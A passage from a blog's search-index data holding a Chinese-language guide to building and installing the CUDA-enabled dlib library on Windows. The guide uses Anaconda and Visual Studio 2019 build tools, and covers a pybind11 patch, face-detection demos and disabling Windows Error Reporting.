\u7684\u78c1\u76d8\u7a7a\u95f4\uff08\u5176\u4e2d C \u76d8\u56fa\u5b9a\u5360\u7528\u7ea6 2 GB\uff09\uff0c\u4f46\u8fd9\u6bd4\u8d77\u6765\u5df2\u7ecf\u8db3\u591f\u5c0f\u4e86\u3002 \u5371\u9669 \u4f60\u53ef\u80fd\u60f3\u95ee Visual Studio 2015\uff08\u542b\uff09\u4ee5\u4e0b\u7b49\u4e0d\u5728\u6b64\u5217\u7684 Visual Studio \u7248\u672c\u884c\u4e0d\u884c\uff0c\u8fd9\u91cc\u660e\u786e\u8868\u793a\uff1a \u4e0d\u884c\uff01\uff01\uff01 #if _MSC_VER < 1910 || _MSC_VER >= 1930 #error -- unsupported Microsoft Visual Studio version! Only the versions between 2017 and 2019 (inclusive) are \u53e6\u89c1\uff1a CUDA Installation Guide for Microsoft Windows CUDA Compilers \u4ee5\u4e0b Visual Studio \u5de5\u4f5c\u8d1f\u8f7d\u4e2d\uff0c \u5fc5\u987b \u5168\u90e8\u62e5\u6709\uff1a MSVC VS 2017\uff08\u6216 2019\uff09C++ x64/x86 \u751f\u6210\u5de5\u5177 Windows 10 SDK \u7528\u4e8e Windows \u7684 C++ CMake \u5de5\u5177 \u5371\u9669 \u6ce8\u610f\u6700\u540e\u4e00\u4e2a \u7528\u4e8e Windows \u7684 C++ CMake \u5de5\u5177 \u5c31\u7b97\u4f60\u5df2\u7ecf\u6709\u4e86 Kitware \u7684 CMake \u4f60\u4ecd\u7136\u9700\u8981\u52fe\u9009\uff0c\u4e0d\u7136\u5c31\u7b97\u901a\u8fc7\u4e86 CXX \u7f16\u8bd1\u5668\u6d4b\u8bd5\u9636\u6bb5\uff0c\u5728\u5b9e\u9645\u7f16\u8bd1\u7684\u65f6\u5019\u4ecd\u7136\u53ef\u80fd broken\u3002 \u5982\u56fe\u6240\u793a\uff1a \u8bb0\u5f97\u4fee\u6539\u5b89\u88c5\u8def\u5f84\uff0c\u522b\u4e00\u80a1\u8111\u5168\u585e C \u76d8\u4e86\uff1a \u5371\u9669 \u8bf7\u5728\u9000\u51fa Visual Studio Installer \u540e\u7acb\u5373\u68c0\u67e5\u4f60\u7684\u4e34\u65f6\u6587\u4ef6\u5939\uff0c\u4f8b\u5982 C:\\Users\\AkibaArisa\\Temp \uff0cVisual Studio Installer \u53ef\u80fd\u4f1a\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u5bfc\u81f4\u9664\u4e86 \u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c \u7684\u7a0b\u5e8f\u4ee5\u5916\uff0c\u5747\u65e0\u6cd5\u5199\u5165\u8be5\u6587\u4ef6\u5939\u3002 \u4f60\u6240\u9700\u8981\u505a\u7684\u5c31\u662f\u68c0\u67e5\u8fd9\u4e2a\u4e34\u65f6\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u5982\u679c\u53d1\u73b0\u6709\u95ee\u9898\uff0c\u5219\u7528\u4ee5\u4e0b\u65b9\u6cd5\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1a \u53f3\u952e\u8be5\u6587\u4ef6\u5939 - \u5c5e\u6027 - \u5b89\u5168 - \u7f16\u8f91 - Everyone - \u52fe\u9009 \u5b8c\u5168\u63a7\u5236 - \u786e\u8ba4 \u62df\u8bae\u65b9\u6848\u7684\u6267\u884c\u6b65\u9aa4 \u00b6 \u6784\u5efa Conda \u73af\u5883 \u00b6 \u7b14\u8005\u7684 PyCharm \u80fd\u8ba9\u65b0\u9879\u76ee\u9009\u62e9 Conda \u73af\u5883\u5e76\u9ed8\u8ba4\u6784\u5efa\u597d\uff0c\u8fd9\u91cc\u7565\u8fc7\u4f7f\u7528 IDE \u6784\u5efa\u7684\u65b9\u6cd5\u3002 \u6216\u8005\u4f7f\u7528\u624b\u52a8\u6784\u5efa\uff1a conda create -n dlib_build_test python=3.10 \u7136\u540e\u8fdb\u5165\u865a\u62df\u73af\u5883\uff1a conda activate dlib_build_test \u5b89\u88c5 CUDA \u548c cuDNN \u00b6 \u4e0d\u901a\u8fc7 Nvidia \u5b98\u7f51\uff0c\u800c\u662f\u901a\u8fc7 Conda \u5b89\u88c5 CUDA \u548c cuDNN\u3002 conda install cuda cudnn -c nvidia \u63a5\u4e0b\u6765\u53ef\u80fd\u4f1a\u7b49\u5f85\u4e00\u4f1a\uff0c\u56e0\u4e3a\u8981\u4e0b\u8f7d\u5f88\u591a\u4e1c\u897f\u3002 \u5b89\u88c5\u540e\u53ef\u4ee5\u901a\u8fc7 conda list \u547d\u4ee4\u786e\u8ba4\u5b89\u88c5\u7684\u7248\u672c\uff1a # Name Version Build Channel ... cuda 11.6.2 h65bbf44_0 nvidia cuda-cccl 11.6.55 hd268e57_0 nvidia cuda-command-line-tools 11.6.2 h65bbf44_0 nvidia cuda-compiler 11.6.2 h65bbf44_0 nvidia cuda-cudart 11.6.55 h5fb1900_0 nvidia cuda-cuobjdump 11.6.124 h8654613_0 nvidia cuda-cupti 11.6.124 h532822a_0 nvidia cuda-cuxxfilt 11.6.124 h3f9c74b_0 nvidia cuda-libraries 11.6.2 h65bbf44_0 nvidia cuda-libraries-dev 11.6.2 h65bbf44_0 nvidia cuda-memcheck 11.6.124 hea6bc18_0 nvidia cuda-nvcc 11.6.124 h769bc0d_0 nvidia cuda-nvdisasm 11.6.124 he05ff55_0 nvidia cuda-nvml-dev 11.6.55 h2bb381e_0 nvidia cuda-nvprof 11.6.124 he581663_0 nvidia cuda-nvprune 11.6.124 hb892de1_0 nvidia cuda-nvrtc 11.6.124 h231bd66_0 nvidia cuda-nvrtc-dev 11.6.124 hd7d06dc_0 nvidia cuda-nvtx 11.6.124 hee9d5a4_0 nvidia cuda-nvvp 11.6.124 h6a974fa_0 nvidia cuda-runtime 11.6.2 h65bbf44_0 nvidia cuda-sanitizer-api 11.6.124 ha4888a7_0 nvidia cuda-toolkit 11.6.2 h65bbf44_0 nvidia cuda-tools 11.6.2 h65bbf44_0 nvidia cuda-visual-tools 11.6.2 h65bbf44_0 nvidia cudatoolkit 11.3.1 h59b6b97_2 cudnn 8.2.1 cuda11.3_0 ... \u663e\u7136\uff0c\u6211\u5b89\u88c5\u7684 CUDA \u7248\u672c\u662f 11.6.2 \uff0ccuDNN \u7248\u672c\u662f 8.2.1 \u3002 \u5b89\u88c5\u5b8c\u6210\u540e\u786e\u8ba4 nvcc.exe \u7684\u5b89\u88c5\u4f4d\u7f6e\uff0c\u5e76\u8bb0\u4f4f\u5b83\u3002 ( dlib_build_test ) I:\\Developer\\Python\\project\\dlib_build_test > where nvcc : : I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe \u4f8b\u5982\u73b0\u5728\u5b83\u5728 I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe \u3002 \u83b7\u53d6 dlib \u6e90\u7801 \u00b6 \u4ece Releases \u4e0b\u8f7d\uff1a\uff08\u63a8\u8350\uff09 v19.23 \u6216\u8005\u4ece GitHub\u514b\u9686\uff1a git clone https://github.com/davisking/dlib.git cd dlib \u5728\u6784\u5efa\u4e4b\u524d \u00b6 \u8fdb\u5165 MSVC x64 \u7f16\u8bd1\u73af\u5883 \u00b6 %comspec% /k \"I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\" \u5176\u4e2d\u7684\u8def\u5f84\u9700\u8981\u6839\u636e\u4f60\u7684 Visual Studio \u7684\u5b89\u88c5\u4f4d\u7f6e\u800c\u6539\u53d8\uff0c\u4f46\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5176\u5b9e\u662f\u4ece\u5f00\u59cb\u83dc\u5355\u4e2d\u627e\u5230 x64 Native Tools Command Prompt for VS 2019 \u7684\u5feb\u6377\u65b9\u5f0f\uff0c\u7136\u540e\u70b9\u51fb\u53f3\u952e\u67e5\u770b\u5c5e\u6027\u3002 \u590d\u5236\u5e76\u7c98\u8d34\u5176 \u76ee\u6807 \u5373\u53ef\u3002 \u8fd0\u884c\u540e\uff0c\u8fd9\u4e2a bat \u811a\u672c\u5c06\u4f1a\u81ea\u52a8\u628a MSVC \u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u5230\u4f60\u7684\u4e34\u65f6\u73af\u5883\u53d8\u91cf\u4e2d\uff08\u4ec5\u5728\u5f53\u524d\u63a7\u5236\u53f0\u6709\u6548\uff09\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u6784\u5efa dlib \u7684\u65f6\u5019\u4f7f\u7528 MSVC \u7684\u7f16\u8bd1\u5668\u4e86\u3002 \u73b0\u5728\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\u91cd\u8981\u7684\u73af\u5883\u53d8\u91cf\u662f\u5426\u8bbe\u7f6e\u6b63\u786e\uff1a where cmake : : G:\\Tools for Windows\\CMake\\bin\\cmake.exe : : I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\Common7\\IDE\\CommonExtensions\\Microsoft\\CMake\\CMake\\bin\\cmake.exe where nmake : : I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.29.30133\\bin\\Hostx64\\x64\\nmake.exe where cl : : I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.29.30133\\bin\\Hostx64\\x64\\cl.exe \u63d0\u793a \u8fd0\u884c where cmake \u7684\u65f6\u5019\u51fa\u73b0\u4e86\u4e24\u4e2a cmake \uff0c\u5176\u4e2d\u4e00\u4e2a\u662f Kitware \u7684 cmake\uff0c\u53e6\u4e00\u4e2a\u662f MSVC \u7684 cmake\u3002\u800c dlib \u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u4f1a\u68c0\u67e5\u6240\u6709 cmake \u7684\u8def\u5f84\uff0c\u5982\u679c\u4e0d\u5b58\u5728 MSVC \u7684 cmake\uff0c\u811a\u672c\u4f1a\u62a5\u9519\u800c\u505c\u6b62\u3002 \u4fee\u6539 dlib \u6e90\u7801 \u00b6 \u89c1 Dlib failed to build due to many errors: error C2065 and C2338 \u00b7 Issue #2463 \u00b7 davisking/dlib \u6253\u5f00 dlib\\dlib\\external\\pybind11\\include\\pybind11/numpy.h \uff0c\u627e\u5230\uff1a numpy.h 26 27 28 29 #if defined(_MSC_VER) # pragma warning(push) # pragma warning(disable: 4127) // warning C4127: Conditional expression is constant #endif \u6dfb\u52a0\u4e24\u884c\uff0c\u6539\u4e3a\uff1a numpy.h 26 27 28 29 30 31 #if defined(_MSC_VER) # pragma warning(push) # pragma warning(disable: 4127) // warning C4127: Conditional expression is constant #include <BaseTsd.h> typedef SSIZE_T ssize_t ; #endif \u5f00\u59cb\u6784\u5efa \u00b6 mkdir build cd build cmake .. -DDLIB_USE_CUDA=1 -DUSE_AVX_INSTRUCTIONS=1 -DCUDAToolkit_ROOT= %NVCC_PATH% \u5176\u4e2d %NVCC_PATH% \u662f\u4f60\u5728\u4e4b\u524d\u83b7\u53d6\u7684\u8def\u5f84\uff0c\u4f8b\u5982 I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe \u3002 \u57fa\u4e8e\u6211\u4eec\u505a\u597d\u7684\u524d\u671f\u94fa\u57ab\uff0c\u7406\u8bba\u4e0a\u8fd9\u91cc\u53ef\u4ee5\u4e00\u6b21\u6027\u6784\u5efa\u6210\u529f\uff0c\u5982\u679c\u6784\u5efa\u4ecd\u7136\u6ca1\u6709\u6210\u529f\uff0c\u8bf7\u4ed4\u7ec6\u9605\u8bfb CMakeError.log \u6587\u4ef6\uff0c\u5206\u6790\u5176\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\u3002\u5728\u6bcf\u6b21\u91cd\u65b0\u6784\u5efa\u4e4b\u524d\uff0c\u8bf7\u5148\u5220\u9664 build \u6587\u4ef6\u5939\u91cc\u7684\u6240\u6709\u5185\u5bb9\u3002 \u5c1d\u8bd5\u7f16\u8bd1 \u00b6 cmake --build . \u540c\u4e0a\uff0c\u7406\u8bba\u4e0a\u662f\u4e00\u6b21\u6027\u6784\u5efa\u6210\u529f\u3002 \u5c1d\u8bd5\u5b89\u88c5 \u00b6 python setup.py install --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT \u5371\u9669 \u5fc5\u987b\u6dfb\u52a0 --no DLIB_GIF_SUPPORT \u53c2\u6570\uff0c\u5426\u5219\u4f1a\u53d1\u751f\u9519\u8bef\uff1a error C2734: \u201cGifAsciiTable8x8\u201d: \u5982\u679c\u4e0d\u662f\u5916\u90e8\u7684\uff0c\u5219\u5fc5\u987b\u521d\u59cb\u5316\u5e38\u91cf\u5bf9\u8c61 \u89c1 Dlib install errors out : error C2734: 'GifAsciiTable8x8' : 'const' object must be initialized if not 'extern' \u00b7 Issue #2358 \u00b7 davisking/dlib \u5b9e\u9645\u4e0a\uff0c\u5728\u975e\u624b\u52a8\u7f16\u8bd1\u73af\u5883\u4e2d\uff08\u4f8b\u5982\u76f4\u63a5\u4f7f\u7528 pip install \uff09\u5b89\u88c5\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6307\u5b9a\u8be5\u53c2\u6570\uff1a pip install -v --install-option= \"--no\" --install-option= \"DLIB_GIF_SUPPORT\" dlib \u4ee5\u53ca\u5982\u679c\u4f60\u60f3\u7f16\u8bd1\u51fa .whl \u6587\u4ef6\u9020\u798f\u4ed6\u4eba\uff0c\u5728\u7f16\u8bd1\u65f6\u540c\u6837\u9700\u8981\u52a0\u5165\u8be5\u53c2\u6570\uff0c\u5373\uff1a python setup.py bdist_wheel --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT \u5728\u5b89\u88c5\u4e4b\u540e \u00b6 \u5378\u8f7d\u65e7\u7248\u672c\u7684 dlib \u00b6 \u5c31\u7b97\u5728\u4e0a\u4e00\u6b65\u7684 python setup.py install \u6ca1\u6709\u4efb\u4f55\u62a5\u9519\uff0c\u6211\u4eec\u7684 dlib \u4e5f \u53ef\u80fd \u8fd8\u6ca1\u6709\u6b63\u786e\u5b89\u88c5\u3002 \u5bf9\u4e8e\u4e00\u4e9b\u7528\u6237\uff0c\u4ed6\u4eec\u53ef\u80fd\u662f\u5c5e\u4e8e \u4e2d\u9014 \u52a0\u5165\u8fd9\u4e2a\u65b9\u6848\u7684\u3002\u4f8b\u5982\uff0c\u4ed6\u4eec\u5728\u6b64\u4e4b\u524d\u5df2\u7ecf\u4ece conda install -c conda-forge dlib \u5b89\u88c5\u4e86\u4e0d\u5e26 CUDA \u7684 dlib\u3002 \u56e0\u4e3a\u7248\u672c\u539f\u56e0\uff08Release \u4e0b\u8f7d\u7684\u662f 19.23 \u7248\u672c\uff0c\u800c conda install \u5b89\u88c5\u7684\u662f 19.23.1 \u7248\u672c\uff09\uff0c\u65e7\u7248\u672c\u7684 dlib \u4e0d\u4f1a\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64 dlib . DLIB_USE_CUDA \u7684\u503c\u5c06\u4ecd\u7136\u662f False \u3002 \u6b64\u65f6\u5378\u8f7d\u539f\u6765\u5b89\u88c5\u7684 dlib conda remove dlib \u7136\u540e\u518d\u8fdb\u884c\u4e00\u6b21\u4e0a\u4e00\u6b65\u7684\u5b89\u88c5\u64cd\u4f5c python setup.py install --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT \u73b0\u5728 dlib . DLIB_USE_CUDA \u7684\u503c\u5e94\u5f53\u662f True \u5173\u95ed Windows \u9519\u8bef\u62a5\u544a\u670d\u52a1 \u00b6 \u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u7384\u5b66\u7684\u4e1c\u897f\u3002\u5728\u542f\u7528\u4e86 CUDA \u7684 dlib \u6b63\u786e\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6709\u4e9b\u4eba\u5728\u8fd0\u884c\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u53d1\u751f\u8fd9\u4e2a\u9519\u8bef\u3002\u5177\u4f53\u4f53\u73b0\u5982\u4e0b\uff1a \u8fd9\u91cc\u6709\u4e24\u4efd\u5dee\u4e0d\u591a\u7684\u4eba\u8138\u68c0\u6d4b demo\uff0c\u5176\u4e2d\u4e00\u4e2a\u4f7f\u7528 HOG\uff0c\u53e6\u4e00\u4e2a\u4f7f\u7528 CNN\u3002 HOG CNN detection.py 1 2 3 4 5 6 7 8 9 10 11 12 import cv2 import imutils import dlib detector = dlib . get_frontal_face_detector () image = cv2 . imread ( 'image/test.jpg' ) resized_image = imutils . resize ( image , width = 600 ) rgb = cv2 . cvtColor ( resized_image , cv2 . COLOR_BGR2RGB ) results = detector ( rgb , 1 ) for result in results : print ( result ) detection.py 1 2 3 4 5 6 7 8 9 10 11 12 13 import cv2 import imutils import dlib detector = dlib . cnn_face_detection_model_v1 ( 'model/mmod_human_face_detector.dat' ) image = cv2 . imread ( 'image/test.jpg' ) resized_image = imutils . resize ( image , width = 600 ) rgb = cv2 . cvtColor ( resized_image , cv2 . COLOR_BGR2RGB ) results = detector ( rgb , 1 ) for result in results : print ( result . rect ) print ( result . confidence ) \u5f53 dlib \u4f7f\u7528 get_frontal_face_detector () \uff08HOG\uff09\u8fdb\u884c\u4eba\u8138\u68c0\u6d4b\u65f6\uff0c\u4e0d\u4f1a\u53d1\u751f\u4efb\u4f55\u95ee\u9898\u3002 \u5f53 dlib \u4f7f\u7528 cnn_face_detection_model_v1 () \uff08CNN\uff09\u8fdb\u884c\u4eba\u8138\u68c0\u6d4b\u65f6\uff0c\u80fd\u987a\u5229\u8fdb\u884c\u68c0\u6d4b\uff0c\u4efb\u52a1\u7ba1\u7406\u5668\u7684 CUDA \u4f7f\u7528\u7387\u4e5f\u4f1a\u6b63\u5e38\u4e0a\u6da8\u3002 \u4f46\u662f\u5728\u68c0\u6d4b\u7ed3\u675f\u4e4b\u540e\uff0c\u8fd9\u4e2a\u811a\u672c\u4f1a\u5361\u4f4f\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\u53ef\u4ee5\u53d1\u73b0 C \u76d8\u4f7f\u7528\u7387\u63a5\u8fd1 100%\u3002\u5927\u7ea6 1~2 \u5206\u949f\u540e C \u76d8\u4f7f\u7528\u7387\u6062\u590d\u6b63\u5e38\uff0c\u811a\u672c\u4e5f\u6b63\u5e38\u7ed3\u675f\u3002 \u4e8b\u540e\u8c03\u67e5\u53d1\u73b0\uff0c\u662f Windows \u9519\u8bef\u62a5\u544a \u6b63\u5728\u5411 C \u76d8\u5199\u5165\u5927\u91cf\u5185\u5bb9\uff08\u5185\u5b58\u8f6c\u50a8\uff09\uff0c\u5199\u5165\u7684\u4f4d\u7f6e\u662f C:\\Users\\AkibaArisa\\AppData\\Local\\CrashDumps \uff0c\u6bcf\u6b21\u5199\u5165\u4e00\u4e2a\u5927\u5c0f\u7ea6\u4e3a 1 GB \u7684 .dmp \u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e0e python \u6709\u5173\u3002 \u5b9e\u9645\u4e0a\u6211\u4eec\u7684 python \u811a\u672c\u5e76\u6ca1\u6709\u53d1\u751f\u4efb\u4f55\u5d29\u6e83\uff0c\u800c\u4e14\u4e5f\u662f\u6b63\u5e38\u7ed3\u675f\u7684\uff0c\u56e0\u6b64\u8fd9\u4e2a\u9519\u8bef\u62a5\u544a\u7eaf\u5c5e\u753b\u86c7\u6dfb\u8db3\u3002 \u73b0\u5728\u5173\u95ed\u6389 Windows \u9519\u8bef\u62a5\u544a\u670d\u52a1 \uff1a \u9996\u5148\u4f7f\u7528 PowerShell \u505c\u7528\uff1a \uff08\u89c1 Disable-WindowsErrorReporting (WindowsErrorReporting) | Microsoft Docs \uff09 PS C :\\> Disable-WindowsErrorReporting # False \u7136\u540e\u5728\u670d\u52a1\u4e2d\u505c\u7528\uff1a \u6253\u5f00 \u670d\u52a1 \uff08\u8fd0\u884c services.msc \u6216\u8005\u4f7f\u7528\u4efb\u52a1\u7ba1\u7406\u5668\uff09\u3002 \u627e\u5230 Windows Error Reporting Service \uff0c\u53f3\u952e \u5c5e\u6027 \u3002 \u5c06 \u542f\u52a8\u7c7b\u578b \u8bbe\u4e3a \u7981\u7528 \u3002 \u5728 \u670d\u52a1\u72b6\u6001 \u5904\u70b9\u51fb \u505c\u6b62 \u3002 \u5982\u6b64\u4e00\u6765\uff0cWindows \u5c06\u4e0d\u4f1a\u518d\u4ea7\u751f\u9519\u8bef\u62a5\u544a\uff0c\u6211\u4eec\u4f7f\u7528\u4e86 cnn_face_detection_model_v1 () \u7684 python \u811a\u672c\u4e5f\u5c06\u5728\u68c0\u6d4b\u5b8c\u6210\u540e\u6b63\u5e38\u7ed3\u675f\uff0c\u4e0d\u4f1a\u4e00\u76f4\u6401\u8fd9\u5361\u7740\u3002 \u7ed3\u8bba \u00b6 \u7279\u5b9a\u7684 CUDA + Visual Studio + dlib + python \u7248\u672c\u7684\u7ec4\u5408\u76ee\u524d\u4ecd\u7136\u662f dlib \u4e2d\u7684\u4e00\u5927\u96be\u9898\u3002\u5982\u4f60\u6240\u89c1\uff0c\u8fd9\u4e2a\u65b9\u6848\u7684\u9605\u8bfb\u52a0\u5b9e\u8df5\u7684\u603b\u65f6\u957f\u53ef\u80fd\u8d85\u8fc7\u4e86\u534a\u4e2a\u5c0f\u65f6\uff0c\u5948\u4f55\u4e0d\u540c\u8f6f\u4ef6\uff0c\u4e0d\u540c\u5e73\u53f0\u4e4b\u95f4\u7684\u914d\u5957\u7684\u786e\u5f88\u56f0\u96be\uff0c\u4f46\u6211\u4eec\u4ecd\u5c06\u89e3\u51b3\u4ed6\u4eec\u3002\u76f8\u4fe1\u8fd9\u4e2a\u65b9\u6848\u53ef\u4ee5\u5e2e\u52a9\u5230\u66f4\u591a\u7684\u4eba\u3002 \u81f4\u8c22 \u00b6 \u611f\u8c22 dlib \u7684\u6240\u6709\u8d21\u732e\u8005\u4e3a\u6211\u4eec\u5e26\u6765\u4e86\u5b9e\u7528\u7684\u673a\u5668\u5b66\u4e60\u5de5\u5177\uff1b\u611f\u8c22\u6240\u6709\u5728 GitHub dlib \u4ed3\u5e93\u4e0b\u63d0\u51fa\u548c\u89e3\u51b3 issue \u7684\u5f00\u53d1\u8005\u548c\u7814\u7a76\u4eba\u5458\uff0c\u6ca1\u6709\u4ed6\u4eec\u8fd9\u7bc7\u6587\u7ae0\u5c06\u65e0\u4ece\u4e0b\u624b\uff1b\u4e5f\u611f\u8c22\u6211\u7684\u6bd5\u8bbe\u8001\u5e08\uff0c\u9009\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u8bfe\u9898\uff0c\u628a\u6211\u618b\u51fa\u4e86\u4e00\u7bc7\u8fd9\u6837\u7684\u6587\u7ae0\u3002","title":"\u57fa\u4e8e Anaconda \u7684 dlib\uff08CUDA \u7248\u672c\uff09\u5b89\u88c5\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_1","text":"\u5386\u65f6 14 \u4e2a\u5c0f\u65f6\uff0c\u53cd\u590d\u4e0b\u8f7d\u9ad8\u8fbe 60 GB\uff0c\u91cd\u65b0\u90e8\u7f72\u6574\u4e2a Visual Studio \u591a\u8fbe 5 \u6b21\uff0c\u4ece\u800c\u6253\u78e8\u51fa\u7684 dlib \u5b89\u88c5\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\uff0c\u4e13\u6ce8\u4e8e\u89e3\u51b3 dlib \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5404\u79cd\u7591\u96be\u6742\u75c7\u3002 \u4f60\u662f\u5426\u6709\u4ee5\u4e0b\u82e6\u607c\uff1f You must use Visual Studio to build a python extension on Windows \u5bf9\u7740\u5341\u51e0\u4e2a GB \u7684 Visual Studio \u53d1\u6101 Anaconda \u88c5\u4e0a\u7684 dlib \u6ca1\u6cd5\u8c03\u7528 GPU \u4e0d\u4ec5 GPU \u5360\u7528\u7387\u4e3a 0\uff0cCPU \u4e5f\u8dd1\u4e0d\u6ee1 \u88c5\u4e0a\u4e86 Visual Studio\uff0c\u4ecd\u7136\u65e0\u6cd5\u7f16\u8bd1 dlib x64 \u548c x86 \u6253\u67b6 \u51e0\u4e2a CMake \u4e00\u8d77\u6253\u67b6 \u82f1\u4f1f\u8fbe CUDA \u9a71\u52a8\u5728 C \u76d8\u5230\u5904\u91ca\u653e\u6587\u4ef6\uff08lashi\uff09 \u660e\u660e\u88c5\u4e86 CUDA\uff0cCMakeList \u5374\u4ee5\u5404\u79cd\u5404\u6837\u7684\u7406\u7531\u4e0d\u8ba9\u4f60\u7528 \u4f8b\u5982\u5acc\u5f03\u4f60\u7684 CUDA \u7248\u672c\u592a\u9ad8\u6216\u592a\u4f4e \u4f8b\u5982\u5acc\u5f03\u4f60\u7684 Visual Studio \u7248\u672c\u592a\u9ad8\u6216\u592a\u4f4e CMakeList.txt \u7b2c 5 \u884c\u7ecf\u5178\u62a5\u9519 Permission Denied Temp \u6587\u4ef6\u5939\u5199\u5165\u4e0d\u4e86\u4e86 error C2734: \u201cGifAsciiTable8x8\u201d: \u5982\u679c\u4e0d\u662f\u5916\u90e8\u7684\uff0c\u5219\u5fc5\u987b\u521d\u59cb\u5316\u5e38\u91cf\u5bf9\u8c61 error C2065: \u201cssize_t\u201d: \u672a\u58f0\u660e\u7684\u6807\u8bc6\u7b26 \u5386\u7ecf\u5343\u8f9b\u4e07\u82e6\u88c5\u5b8c\u4e86\u7ed3\u679c\u8fd8\u662f dlib . DLIB_USE_CUDA == False ... \u88c5 dlib \u4e00\u76f4\u662f\u673a\u5668\u5b66\u4e60\u9886\u57df\u7684\u4e00\u4e2a\u5927\u96be\u9898\uff0c\u5b83\u8981\u6c42\u5f00\u53d1\u4eba\u5458\u62e5\u6709\u67d0\u4e9b\u7279\u5b9a\u7684 CUDA + Visual Studio + dlib + python \u7248\u672c\u7684\u7ec4\u5408\uff0c\u8fd9\u4e9b\u7ec4\u5408\u4e00\u65e6\u6709\u4e00\u4e2a\u73af\u8282\u51fa\u4e86\u95ee\u9898\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6574\u4e2a dlib \u6ca1\u6cd5\u7528\uff0c\u800c dlib \u53c8\u662f\u5f88\u591a\u5e93\uff08\u4f8b\u5982 face_recognition \uff09\u7684\u4f9d\u8d56\u5e93\u3002\u8fd9\u4e9b\u8270\u96be\u9669\u963b\u5c06\u6781\u5927\u5730\u6253\u51fb\u5f00\u53d1\u4eba\u5458\u5728\u673a\u5668\u5b66\u4e60\u9886\u57df\u653b\u575a\u7684\u4fe1\u5fc3\u3002 \u5373\u4f7f\u662f\u6709 \u4e07\u80fd \u4e4b\u79f0\u7684 Anaconda \uff0c\u5b83\u4e5f\u4e0d\u80fd\u5b8c\u5168\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u4e3a\u5b83\u4e0b\u8f7d\u7684 dlib \u6ca1\u6709\u63d0\u4f9b GPU \u652f\u6301\uff0c\u8fd9\u76f4\u63a5\u9020\u6210\u4e86 \u4e00\u6838\u6709\u96be\uff0c\u4e07\u6838\u56f4\u89c2 \u7684\u7ecf\u5178\u5c40\u9762\u3002\u800c\u76ee\u524d\uff082022 \u5e74 4 \u6708\u5e95\uff09\u552f\u4e00\u80fd\u5728 Anaconda \u4ed3\u5e93\u4e2d\u627e\u5230\u7684\u6709\u5173 CUDA \u548c GPU \u7684\u8f6f\u4ef6\u5305\u53ea\u63d0\u4f9b\u4e86 Linux \u7684\u7f16\u8bd1\u7248\u672c\uff08 zeroae/dlib-cuda \u548c hoan/dlib-gpu \uff09\u4e14\u5747\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u66f4\u65b0\u3002 \u8fd9\u4f7f\u5f97\u624b\u5934\u6ca1\u6709 Visual Studio \u7684\u5f00\u53d1\u4eba\u5458\uff08\u5176\u5b9e\u5c31\u7b97\u6709 Visual Studio \u4e5f\u5dee\u4e0d\u591a\uff09\u5728 Windows \u5e73\u53f0\u4e0a\u5229\u7528 CNN\uff08\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff09\u8fdb\u884c\u4eba\u8138\u8bc6\u522b\u6216\u8005\u5176\u4ed6\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u65f6\uff0c\u7b80\u76f4\u548c\u5750\u7262\u4e00\u6837\u3002 \u8fd9\u4e2a\u65b9\u6848\u7684\u51fa\u73b0\uff0c\u5c31\u662f\u4e3a\u4e86\u7528\u4e00\u4e2a\u7b80\u5355\u3001\u76f4\u89c2\u3001\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u4e00\u6b21\u6027\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002","title":"\u7eea\u8bba"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_2","text":"\u5728\u6240\u6709\u6b65\u9aa4\u5f00\u59cb\u4e4b\u524d\uff0c\u8bf7\u5148\u786e\u4fdd\u4f60\u6ee1\u8db3\u4ee5\u4e0b\u524d\u63d0\u6761\u4ef6\uff1a","title":"\u62df\u8bae\u65b9\u6848\u7684\u524d\u63d0\u6761\u4ef6"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_3","text":"\u4e3a\u4e86\u907f\u514d\u4e0d\u5fc5\u8981\u7684\u9ebb\u70e6\uff0c\u8bf7\u5728\u63a5\u4e0b\u6765\u7684 \u6240\u6709\u6b65\u9aa4 